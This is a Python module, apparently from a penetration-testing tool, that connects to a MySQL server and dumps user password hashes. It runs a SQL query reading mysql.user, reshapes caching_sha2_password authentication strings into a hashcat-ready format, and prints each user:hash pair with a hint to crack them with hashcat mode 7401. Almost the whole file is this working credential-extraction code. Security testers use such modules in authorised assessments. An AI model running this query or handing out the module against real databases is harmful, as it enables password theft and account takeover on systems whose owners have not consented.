from ptsrvtester.protocols.mysql.utils.registry import create_mysql_connection


__MODULELABEL__ = "MySQL credential dump module"
__MODULECODE__ = "DUMP_CREDS"
__ORDER__ = 10


DUMP_QUERY="""
SELECT user,
       CONCAT('$mysql', SUBSTR(authentication_string,1,3),
              LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0),
              '*', INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash
FROM mysql.user
WHERE plugin = 'caching_sha2_password'
    AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
"""


def _mysql_dump_creds(ctx):
    connection = create_mysql_connection(ctx)

    if connection is None:
        return

    try:
        with connection.cursor() as cursor:
            ctx.debug(f"Executed query: {DUMP_QUERY}")
            cursor.execute(DUMP_QUERY)
            ctx.debug(f"Affected row count: {cursor.rowcount}")
            query_response = cursor.fetchall()

            creds = query_response

        if creds:
            ctx.out(f"Dumped users and their password hashes. Use hashcat mode 7401 to crack these hashes:", "VULN", indent=4)
            for user, pass_hash in creds:
                ctx.out(f"{user}:{pass_hash}", "VULN", indent=8)

        else:
            ctx.out("Could not dump credentials", "OK", indent=4)
    except Exception as e:
        ctx.out(f"Could not dump credentials: {e}", "OK", indent=4)
    finally:
        connection.close()

def run(ctx):
    _mysql_dump_creds(ctx)